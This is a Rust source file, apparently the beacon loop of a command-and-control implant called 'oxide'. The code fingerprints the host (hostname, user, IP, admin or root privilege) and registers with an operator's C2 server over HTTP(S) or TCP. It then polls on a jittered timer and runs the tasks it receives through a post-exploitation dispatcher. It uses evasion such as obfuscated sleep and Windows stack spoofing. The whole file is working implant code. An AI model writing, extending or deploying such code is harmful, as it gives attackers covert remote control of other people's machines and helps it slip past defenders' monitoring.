//! Main beacon loop — register, then poll for tasks every sleep interval.

use crate::comms::{http::HttpTransport, tcp::TcpTransport, Transport};
use crate::config::AgentConfig;
use crate::evasion;
use crate::postex;
use anyhow::Result;
use oxide_common::protocol::{AgentBeacon, AgentRegister};
use oxide_common::types::AgentResult;
use oxide_common::types::{AgentTask, Privilege};
use rand::Rng;
use uuid::Uuid;

pub async fn run(cfg: AgentConfig) -> Result<()> {
    // Collect system info
    let agent_id  = Uuid::new_v4();
    let hostname  = hostname();
    let username  = username();
    let ip        = local_ip();
    let priv_lvl  = current_privilege();

    crate::dbg_log!("agent_id={agent_id} hostname={hostname} user={username} ip={ip} priv={priv_lvl}");

    // Build transport
    let tls = cfg.protocol == "https";
    crate::dbg_log!("building transport proto={} host={} port={}", cfg.protocol, cfg.c2_host, cfg.c2_port);
    let mut transport = match cfg.protocol.as_str() {
        "tcp" => Transport::Tcp(TcpTransport::new(&cfg.c2_host, cfg.c2_port, agent_id)),
        _     => Transport::Http(HttpTransport::new(&cfg.c2_host, cfg.c2_port, tls, agent_id)),
    };

    // Registration
    let reg = AgentRegister {
        agent_id,
        listener_id:   Uuid::nil(),
        build_id:      cfg.build_id.clone(),
        hostname:      hostname.clone(),
        username:      username.clone(),
        domain:        std::env::var("USERDOMAIN").ok(),
        ip:            ip.clone(),
        os:            std::env::consts::OS.to_string(),
        arch:          std::env::consts::ARCH.to_string(),
        pid:           std::process::id(),
        privilege:     priv_lvl,
        sleep_ms:      cfg.sleep_ms,
        jitter_pct:    cfg.jitter_pct,
        ephemeral_pub: String::new(), // ECDH in Phase 2
    };

    // Retry registration with exponential backoff
    let mut backoff = 1u64;
    loop {
        crate::dbg_log!("attempting registration (backoff={backoff}s)...");
        match transport.register(&reg).await {
            Ok(_)  => {
                crate::dbg_log!("registration successful");
                break;
            }
            Err(e) => {
                crate::dbg_log!("registration failed: {e} — retrying in {backoff}s");
                evasion::obfuscated_sleep(backoff * 1000, &cfg.sleep_obf).await;
                backoff = (backoff * 2).min(300);
            }
        }
    }

    // Main beacon loop
    let mut pending_results: Vec<AgentResult> = Vec::new();

    loop {
        // Sleep with jitter
        let jitter = {
            let pct = cfg.jitter_pct as f64 / 100.0;
            let delta = (cfg.sleep_ms as f64 * pct) as u64;
            let j: u64 = rand::thread_rng().gen_range(0..=delta.max(1));
            j
        };
        let sleep_ms = cfg.sleep_ms.saturating_add(jitter);

        // Stack spoof guard during sleep
        #[cfg(target_os = "windows")]
        let _guard = if cfg.stack_spoof {
            Some(evasion::stack_spoof::SpoofGuard::new())
        } else {
            None
        };

        evasion::obfuscated_sleep(sleep_ms, &cfg.sleep_obf).await;

        // Drop guard before beacon (stack must be real for I/O)
        #[cfg(target_os = "windows")]
        drop(_guard);

        let beacon = AgentBeacon {
            agent_id,
            results: std::mem::take(&mut pending_results),
        };

        crate::dbg_log!("beaconing ({} pending results)...", beacon.results.len());
        let resp = match transport.beacon(&beacon).await {
            Ok(r)  => { crate::dbg_log!("beacon ok — {} tasks", r.tasks.len()); r }
            Err(e) => { crate::dbg_log!("beacon error: {e}"); continue; }
        };

        if resp.kill { return Ok(()); }
        if let Some(new_ms) = resp.new_sleep {
            // Dynamic sleep update from operator
            // cfg.sleep_ms = new_ms; // cfg is immutable; rebuild config
        }

        // Execute tasks
        for task in resp.tasks {
            crate::dbg_log!("executing task {} cmd={} args={:?}", task.id, task.command, task.args);
            let result = execute_task(&task).await;
            crate::dbg_log!("task {} done — output={} bytes, err={:?}",
                task.id, result.output.len(), result.error);
            pending_results.push(result);
        }
    }
}

async fn execute_task(task: &AgentTask) -> AgentResult {
    let start = std::time::Instant::now();
    let result = postex::dispatch(&task.command, &task.args).await;
    let elapsed = start.elapsed();

    AgentResult {
        task_id:   task.id,
        agent_id:  Uuid::nil(), // filled by transport
        output:    result.as_ref().map(|s| s.clone()).unwrap_or_default(),
        error:     result.err().map(|e| e.to_string()),
        timestamp: chrono::Utc::now(),
    }
}

// ── OS info helpers ───────────────────────────────────────────────────────────

fn hostname() -> String {
    #[cfg(target_os = "windows")]
    return std::env::var("COMPUTERNAME").unwrap_or_else(|_| "UNKNOWN".into());
    #[cfg(not(target_os = "windows"))]
    std::env::var("HOSTNAME")
        .or_else(|_| std::fs::read_to_string("/etc/hostname").map(|s| s.trim().to_string()))
        .unwrap_or_else(|_| "unknown".into())
}

fn username() -> String {
    #[cfg(target_os = "windows")]
    return std::env::var("USERNAME").unwrap_or_else(|_| "UNKNOWN".into());
    #[cfg(not(target_os = "windows"))]
    std::env::var("USER").unwrap_or_else(|_| "unknown".into())
}

fn local_ip() -> String {
    // Best-effort: connect UDP to 1.1.1.1 to get outbound IP
    std::net::UdpSocket::bind("0.0.0.0:0")
        .and_then(|s| { s.connect("1.1.1.1:80")?; s.local_addr() })
        .map(|a| a.ip().to_string())
        .unwrap_or_else(|_| "0.0.0.0".into())
}

fn current_privilege() -> Privilege {
    #[cfg(target_os = "windows")]
    {
        unsafe {
            use windows_sys::Win32::UI::Shell::IsUserAnAdmin;
            if IsUserAnAdmin() != 0 {
                return Privilege::Admin;
            }
        }
    }
    if username().to_lowercase() == "root" || username().to_lowercase() == "system" {
        return Privilege::System;
    }
    Privilege::User
}
